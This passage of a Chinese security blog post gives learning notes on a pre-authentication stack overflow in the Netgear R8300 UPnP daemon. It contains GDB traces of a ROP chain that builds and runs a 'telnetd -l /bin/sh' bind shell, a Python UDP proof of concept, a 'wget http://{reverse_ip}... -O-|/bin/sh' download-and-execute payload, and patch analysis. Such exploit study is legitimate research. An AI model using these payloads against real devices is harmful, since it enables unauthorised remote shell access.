0x20c</span></span><br><span class="line">      0x230f4                  add    sp,  sp,  <span class="comment">#4096	; 0x1000</span></span><br><span class="line">      0x230f8                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r9,  r10,  r11,  pc&#125;</span><br><span class="line">Breakpoint 1, 0x000230f0 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 3 接连ni，通过pop控制pc为0x13644</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x000230f8  →   pop &#123;r4,  r5,  r6,  r7,  r8,  r9,  r10,  r11,  pc&#125;</span><br><span class="line"></span><br><span class="line">      0x230f0                  add    sp,  sp,  <span class="comment">#524	; 0x20c</span></span><br><span class="line">      0x230f4                  add    sp,  sp,  <span class="comment">#4096	; 0x1000</span></span><br><span class="line"> →    0x230f8                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r9,  r10,  r11,  pc&#125;</span><br><span class="line">   ↳     0x13644                  mov    r0,  r10</span><br><span class="line">         0x13648                  mov    r1,  r5</span><br><span class="line">         0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line">         0x13650                  mov    r0,  r4</span><br><span class="line">         0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line">         0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">         </span><br><span class="line">0x000230f8 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 4 通过strcpy拼接命令字符串到bss的0x9e150</span></span><br><span class="line"><span class="variable">$r0</span>  : 0x0009e150  →  0x00000000</span><br><span class="line"><span class="variable">$r1</span>  : 0x0003f340  →  <span class="string">"telec_dfs_ch_enable"</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x0001364c  →   bl 0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line"></span><br><span class="line">      0x13644                  mov    r0,  r10</span><br><span class="line">      0x13648                  mov    r1,  r5</span><br><span class="line"> →    0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line"> </span><br><span class="line">0x0001364c <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 5 注意，当lr=pc时，ni会跑飞，在下条指令下断可避免（为何这样就会跑飞，原理未知</span></span><br><span class="line"><span class="variable">$lr</span>  : 0x00013650  →   mov r0,  r4</span><br><span class="line"><span class="variable">$pc</span>  : 0x00013650  →   mov r0,  r4</span><br><span class="line"></span><br><span class="line">      0x13644                  mov    r0,  r10</span><br><span class="line">      0x13648                  mov    r1,  r5</span><br><span class="line">      0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line"> →    0x13650                  mov    r0,  r4</span><br><span class="line">      0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line">      0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">      </span><br><span class="line">0x00013650 <span class="keyword">in</span> ?? ()</span><br><span class="line">gef➤  b *0x13654</span><br><span class="line">Breakpoint 2 at 0x13654</span><br><span class="line">gef➤  ni</span><br><span class="line"><span class="comment"># 6 同上，继续通过pop控制pc，此次为0x13648，光修改src，dst还是之前bss中的0x9e150</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x00013658  →   pop &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line"></span><br><span class="line">      0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line">      0x13650                  mov    r0,  r4</span><br><span class="line">      0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line"> →    0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">   ↳     0x13648                  mov    r1,  r5</span><br><span class="line">         0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line">         0x13650                  mov    r0,  r4</span><br><span class="line">         0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line">         0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">         </span><br><span class="line">0x00013658 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 7 pop+strcpy，循环多次，直至拼接出完整的命令字符串</span></span><br><span class="line">    <span class="comment"># 0x13648                  mov    r1,  r5</span></span><br><span class="line">    <span class="comment"># 0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span></span><br><span class="line">    <span class="comment"># 0x13650                  mov    r0,  r4</span></span><br><span class="line">    <span class="comment"># 0x13654                  add    sp,  sp,  #92	; 0x5c</span></span><br><span class="line">    <span class="comment"># 0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span></span><br><span class="line"><span class="comment"># 8 查看src，即bss中0x9e150，其存放strcpy拼接后的命令字符串（display命令可让其每次都显示</span></span><br><span class="line">gef➤  display/s 0x9e150</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -lan_mac"</span></span><br><span class="line"><span class="comment"># 9 节省时间，不用ni而c（要事先下断），看命令字符串的变化</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l   &lt;m:"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/uptime &gt; /tmp/time_tmp"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p %s -f %s -s /%s/%s/%s -d %s -h 1 &amp;"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p 99"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p 9999"</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Breakpoint 2, 0x00013654 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p 9999 &amp; b"</span></span><br><span class="line">gef➤  ni</span><br><span class="line">0x00013650 <span class="keyword">in</span> ?? ()</span><br><span class="line">5: x/s 0x9e150  0x9e150:	<span class="string">"telnetd -l /bin/sh -p 9999 &amp; "</span></span><br><span class="line"><span class="comment"># 10 命令字符串拼接完成后，pop控制pc为0x1a83c，去执行system函数</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x00013658  →   pop &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line"></span><br><span class="line">      0x1364c                  bl     0xb2ec &lt;strcpy@plt&gt;</span><br><span class="line">      0x13650                  mov    r0,  r4</span><br><span class="line">      0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line"> →    0x13658                  pop    &#123;r4,  r5,  r6,  r7,  r8,  r10,  pc&#125;</span><br><span class="line">   ↳     0x1a83c                  mov    r0,  r4</span><br><span class="line">         0x1a840                  bl     0xaaac &lt;system@plt&gt;</span><br><span class="line">0x00013658 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 11 执行system，此时r0即前面拼接好的命令字符串</span></span><br><span class="line"><span class="variable">$r0</span>  : 0x0009e150  →  <span class="string">"telnetd -l /bin/sh -p 9999 &amp; "</span></span><br><span class="line"><span class="variable">$pc</span>  : 0x0001a840  →   bl 0xaaac &lt;system@plt&gt;</span><br><span class="line"></span><br><span class="line">      0x1a83c                  mov    r0,  r4</span><br><span class="line"> →    0x1a840                  bl     0xaaac &lt;system@plt&gt;</span><br><span class="line"></span><br><span class="line">0x0001a840 <span class="keyword">in</span> ?? ()</span><br><span class="line"><span class="comment"># 12 放行，程序崩溃</span></span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"><span class="comment"># 13 upnpd日志中出现system信息，而且ps后发现已启动，exp执行成功</span></span><br><span class="line">[0x0001a844] system(<span class="string">'telnetd -l /bin/sh -p 9999 &amp; '</span>) = 0<span class="comment"># 日志</span></span><br><span class="line">4237 0          1884 S   telnetd -l /bin/sh -p 9999 <span class="comment"># ps</span></span><br></pre></td></tr></table></figure>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
+<li>bss段：C语言的全局变量如果在代码中没有初始化，就会在程序加载时用0初始化。这种数据属于.bss段，在加载时它和.data段一样都是可读可写的数据，但是在ELF文件中.data段需要 占用一部分空间保存初始值，而.bss 段则不需要。也就是说，.bss 段在文件中只占一个Section Header而没有对应的Section，程序加载时.bss段占多大内存空间在Section Header中描述</li>
+<li>stack reuse为什么可行？<ul>
+<li>局部变量的存储空间在每次函数调用时分配，在函数返回时释放</li>
+<li>call_recvfrom函数中，通过recvfrom函数将接收的socket数据保存在call_recvfrom函数栈上的局部变量中，其没有初始化，故局部变量的值是不确定的，第一次send将expayload保存到局部变量中，此时会调用一次call_recvfrom函数，第二次send真正的payload，又会调用一次call_recvfrom函数，而“局部变量的存储空间在每次函数调用时分配，在函数返回时释放”，怎么来保证第二次send时，局部变量还保存着第一次send时的expayload？？？</li>
+<li>//here</li>
+</ul>
+</li>
+<li>exp效果</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp成功，开启了telnet</span></span><br><span class="line">4116 0          1896 S   telnetd -l /bin/sh -p 9999</span><br><span class="line"><span class="comment"># 能连上，但很快断，应该是模拟的问题</span></span><br><span class="line">lxl@ubuntu:~/Desktop/8/squashfs-root$ telnet 192.168.1.2 9999</span><br><span class="line">Trying 192.168.1.2...</span><br><span class="line">Connected to 192.168.1.2.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>
+<ul>
+<li>rop chain的构造，勉强能看懂，自己实践有点难，多积累//here</li>
+</ul>
+<h2 id="fenix"><a href="#fenix" class="headerlink" title="fenix"></a>fenix</h2><p><a href="https://paper.seebug.org/1311/#8" target="_blank" rel="noopener">https://paper.seebug.org/1311/#8</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">显然，R4 - R11 也是可控的，思考一下目前的情况：</span><br><span class="line">    1. 开了 NX 不能用 shellcode。</span><br><span class="line">    2. 有 ASLR，不能泄漏地址，不能使用各种 LIB 库中的符号和 gadget。</span><br><span class="line">    3. strcpy() 函数导致的溢出，payload 中不能包含 \x00 字符。</span><br><span class="line"></span><br><span class="line">其实可控 PC 后已经可以干很多事了，upnpd 内包含大量 system 函数调用，比如 reboot。</span><br><span class="line"></span><br><span class="line">下面探讨下更为 general 的 RCE 利用，一般像这种 ROP 的 payload 中包含 \x00，覆盖返回地址的payload 又不能包含 \x00，就要想办法提前将 ROP payload 注入目标内存。</span><br><span class="line"></span><br><span class="line">比如，利用内存未初始化问题，构造如下 PoC，每个 payload 前添加 \x00 防止程序崩溃。</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.connect((<span class="string">'192.168.2.2'</span>, 1900))</span><br><span class="line">s.send(b<span class="string">'\x00'</span> + b<span class="string">'A'</span> * 0x1ff0)</span><br><span class="line">s.send(b<span class="string">'\x00'</span> + b<span class="string">'B'</span> * 0x633)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line">在漏洞点下断点，</span><br><span class="line">两次拷贝完成后，看下内存布局：</span><br><span class="line">可以看到，由于接收 socket 数据的 buffer 未初始化，在劫持 PC 前我们可以往目标内存注入 6500 多字节的数据。 这么大的空间，也足以给 ROP 的 payload 一片容身之地。</span><br><span class="line"></span><br><span class="line">关于 ROP，使用 strcpy 调用在 bss 上拼接出命令字符串，并调整 R0 指向这段内存，然后跳转 system 执行即可。</span><br><span class="line"></span><br><span class="line">原作者构造的 system(<span class="string">"telnetd -l /bin/sh -p 9999&amp; "</span>) 绑定型 shell。</span><br><span class="line"></span><br><span class="line">经过分析，我发现可以构造 system(<span class="string">"wget http://&#123;reverse_ip&#125;:&#123;reverse_port&#125; -O-|/bin/sh"</span>) 调用，从而无限制任意命令执行。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定型shell：telnetd -l /bin/sh -p 9999&amp;</span></span><br><span class="line"><span class="comment"># 无限制任意命令执行：wget http://&#123;reverse_ip&#125;:&#123;reverse_port&#125; -O-|/bin/sh，怎么用？</span></span><br><span class="line">mac下：</span><br><span class="line">lxl@192  ~/Desktop  nc -lvn 4444</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">User-Agent: Wget/1.19.4 (linux-gnu)</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Host: 192.168.142.1:4444</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">Ubuntu下：</span><br><span class="line">lxl@ubuntu:~/Desktop/8$ wget http://192.168.142.1:4444 -O-|/bin/sh</span><br><span class="line">--2020-11-20 16:37:57--  http://192.168.142.1:4444/</span><br><span class="line">Connecting to 192.168.142.1:4444... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 No headers, assuming HTTP/0.9</span><br><span class="line">Length: unspecified</span><br><span class="line">Saving to: ‘STDOUT’</span><br><span class="line"></span><br><span class="line">-  [&lt;=&gt;                    ]       0  --.-KB/s               /home/lxl/Desktop/8</span><br><span class="line"><span class="comment"># 一直在等，不知道怎么用，怎么个无限制法，与telnet相比有何优势？//here</span></span><br></pre></td></tr></table></figure>
+<h2 id="cq"><a href="#cq" class="headerlink" title="cq"></a>cq</h2><p><a href="https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/" target="_blank" rel="noopener">https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/</a></p>
+<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-11-23-004937.jpg" alt="image-20201120170623224"></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">upnpd程序启用的缓解措施如下，可以看到仅启用了NX机制。另外，由于程序的加载基址为0x8000，故.text段地址的最高字节均为\x00，而在调用strcpy()时存在NULL字符截断的问题，因此在进行漏洞利用时需要想办法绕过NULL字符限制的问题。</span><br><span class="line"> checksec --file ./upnpd</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line">    </span><br><span class="line">SSD公开的漏洞细节中给出了一个方案：通过stack reuse的方式来绕过该限制。具体思路为，先通过socket发送第一次数据，往栈上填充相应的rop payload，同时保证不会造成程序崩溃；再通过socket发送第二次数据用于覆盖栈上的返回地址，填充的返回地址用来实现stack pivot，即劫持栈指针使其指向第一次发送的payload处，然后再复用之前的payload以完成漏洞利用。SSD公开的漏洞细节中的示意图如下。</span><br><span class="line"></span><br><span class="line">实际上，由于recvfrom()函数与漏洞点strcpy()之间的路径比较短，栈上的数据不会发生太大变化，利用stack reuse的思路，只需发送一次数据即可完成利用，示意图如下。在调用ssdp_http_method_check()前，接收的socket数据包保存在upnp_main()函数内的局部缓冲区上，而在ssdp_http_method_check()内，当调用完strcpy()后，会复制一部分数据到该函数内的局部缓冲区上。通过覆盖栈上的返回地址，可劫持栈指针，使其指向upnp_main()函数内的局部缓冲区，复用填充的rop gadgets，从而完成漏洞利用。</span><br><span class="line"></span><br><span class="line">另外在调用strcpy()后，在(4)处还调用了函数sub_B60C()。通过对应的汇编代码可知，在覆盖栈上的返回地址之前，也会覆盖R7指向的栈空间内容，之后R7作为参数传递给sub_B60C()。而在sub_B60C()中，会读取R0指向的栈空间中的内容，然后再将其作为参数传递给strstr()，这意味[R0]中的值必须为一个有效的地址。因此在覆盖返回地址的同时，还需要用一个有效的地址来填充对应的栈偏移处，保证函数在返回前不会出现崩溃。由于libc库对应的加载基址比较大，即其最高字节不为\x00，因此任意选取该范围内的一个不包含\x00的有效地址即可。</span><br><span class="line"></span><br><span class="line">在解决了NULL字符截断的问题之后，剩下的部分就是寻找rop gadgets来完成漏洞利用了，相对比较简单。同样，SSD公开的漏洞细节中也包含了完整的漏洞利用代码，其思路是通过调用strcpy gadget拼接出待执行的命令，并将其写到某个bss地址处，然后再调用system gadget执行对应的命令。</span><br><span class="line"></span><br><span class="line">在给出的漏洞利用代码中，strcpy gadget执行的过程相对比较繁琐，经过分析后，在upnpd程序中找到了另一个更优雅的strcpy gadget，如下。借助该gadget，可以直接在数据包中发送待执行的命令，而无需进行命令拼接。</span><br><span class="line"></span><br><span class="line">.text:0000B764 MOV             R0, R4  ; dest</span><br><span class="line">.text:0000B768 MOV             R1, SP  ; src</span><br><span class="line">.text:0000B76C BL              strcpy</span><br><span class="line">.text:0000B770 ADD             SP, SP, <span class="comment">#0x400</span></span><br><span class="line">.text:0000B774 LDMFD           SP!, &#123;R4-R6,PC&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>fenix</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">signed int __fastcall sub_25B88(const char *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v40; // [sp+24h] [bp-Ch]</span><br><span class="line">  int s; // [sp+600h] [bp+5D0h]</span><br><span class="line">  int *v51; // [sp+628h] [bp+5F8h]</span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  memset(&amp;v40, 0, 0x5DCu);</span><br><span class="line">  v51 = &amp;v40;</span><br><span class="line">  strncpy((char *)&amp;v40, v3, 0x5DBu);</span><br><span class="line"></span><br><span class="line">在更新版固件 V1.0.2.134 中，用 strncpy() 代替 strcpy()，限制了拷贝长度为 0x5db，正好是 buffer 长度减 1。</span><br><span class="line"></span><br><span class="line">补丁中还特意用 memset() 初始化了 buffer。</span><br><span class="line">	这是由于 strncpy() 在拷贝时，如果 n &lt; src 的长度，只是将 src 的前 n 个字符复制到 dest 的前 n 个字符，不会自动添加 \x00，也就是结果 dest 不包括 \x00，需要再手动添加一个 \x00；</span><br><span class="line">	如果 src 的长度小于 n 个字节，则以\x00 填充 dest 直到复制完 n 个字节。</span><br><span class="line"></span><br><span class="line">结合上面的 RCE 利用过程，可见申请内存之后及时初始化是个很好的编码习惯，也能一定程度上避免很多安全问题。</span><br><span class="line"><span class="comment"># v40大小为0x5DC，memset时全部设为0</span></span><br><span class="line"><span class="comment"># strncpy时，限定大小为0x5DB，若src&gt;n，则会占满前0x5DB个位置，其不会自动添加0，但是前面memset时提前设为0了，所以就算src&gt;n,总是能保证最后一个是00</span></span><br></pre></td></tr></table></figure>
+<h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><ul>
+<li><p>注意</p>
+<ul>
+<li>scp向qemu虚拟机传输squashfs-root时，一定要打包打包打包，万无一失</li>
+<li>/usr/sbin/upnpd执行后没有任何反应，没有报错信息没发定位，用sh脚本调试失败，换qemu-arm-static，用–strace选项</li>
+</ul>
+</li>
+<li><p>gdb安装gef插件（可高亮</p>
+</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(wget http://gef.blah.cat/sh -O -)</span>"</span></span><br><span class="line">cat ~/.gdbinit</span><br><span class="line">	<span class="built_in">source</span> /home/lxl/.gdbinit-gef.py</span><br></pre></td></tr></table></figure>
+<ul>
+<li><a href="https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/，函数名是怎么识别出来的ssdp_http_method_check()" target="_blank" rel="noopener">https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/，函数名是怎么识别出来的ssdp_http_method_check()</a></li>
+<li>怎么获取有效地址，不会变的？（用libc中的system函数地址，其他也行</li>
+<li>lr=pc时，ni跑飞</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ni跑飞了，是不是因为$lr=$pc？（exp成功了，所以是跑飞了</span></span><br><span class="line"><span class="comment"># 看到lr和pc相同时，就不要直接ni了，先在下条指令下断，再ni，避免跑飞（具体原理未知</span></span><br><span class="line"><span class="variable">$lr</span>  : 0x00013650  →   mov r0,  r4</span><br><span class="line"><span class="variable">$pc</span>  : 0x00013650  →   mov r0,  r4</span><br><span class="line"> →    0x13650                  mov    r0,  r4</span><br><span class="line">      0x13654                  add    sp,  sp,  <span class="comment">#92	; 0x5c</span></span><br><span class="line">gef➤  b *0x13654</span><br><span class="line">Breakpoint 2 at 0x13654</span><br><span class="line">gef➤  ni</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>有 ASLR，不能泄漏地址，不能使用各种 LIB 库中的符号和 gadget</p>
+<p>  其实可控 PC 后已经可以干很多事了，<code>upnpd</code> 内包含大量 <code>system</code> 函数调用，比如 <code>reboot</code></p>
+<p>  ？？？</p>
+<p>  开了aslr，则加载lib时，其基址会变，因此不可用，但是二进制本身的system可用，其本身加载基址不变吗，为什么ida中搜到的bl system地址，就可用，地址不会变吗？</p>
+<p>  （物理地址与虚拟地址</p>
+<p>  （NX与ASLR</p>
+<p>  //here</p>
+</li>
+<li><p>无限制任意命令执行：wget http://{reverse_ip}:{reverse_port} -O-|/bin/sh，怎么用？//here</p>
+</li>
+<li><p>stack reuse为什么可行？//here</p>
+<ul>
+<li>局部变量的存储空间在每次函数调用时分配，在函数返回时释放</li>
+<li>call_recvfrom函数中，通过recvfrom函数将接收的socket数据保存在call_recvfrom函数栈上的局部变量中，其没有初始化，故局部变量的值是不确定的，第一次send将expayload保存到局部变量中，此时会调用一次call_recvfrom函数，第二次send真正的payload，又会调用一次call_recvfrom函数，而“局部变量的存储空间在每次函数调用时分配，在函数返回时释放”，怎么来保证第二次send时，局部变量还保存着第一次send时的expayload？？？</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p> 参考</p>
+<ul>
+<li><a href="https://paper.seebug.org/1311/#8" target="_blank" rel="noopener">https://paper.seebug.org/1311/#8</a></li>
+<li><a href="https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211" target="_blank" rel="noopener">https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211</a></li>
+<li><a href="https://ssd-disclosure.com/#what-we-do" target="_blank" rel="noopener">https://ssd-disclosure.com/#what-we-do</a></li>
+</ul>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>21Guns
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://21guns.top/2021/06/22/iot/Netgear R8300认证前RCE的漏洞分析及利用/" title="Netgear R8300认证前RCE的漏洞分析及利用">http://21guns.top/2021/06/22/iot/Netgear R8300认证前RCE的漏洞分析及利用/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/路由器/" rel="tag"># 路由器</a>
+              <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
+              <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/21/iot/IOT安全-文章学习笔记-2/" rel="prev" title="IOT安全-文章学习笔记-2">
+      <i class="fa fa-chevron-left"></i> IOT安全-文章学习笔记-2
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/07/03/iot/IDAPython-VxWorks固件解析/" rel="next" title="IDAPython-VxWorks固件解析">
+      IDAPython-VxWorks固件解析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
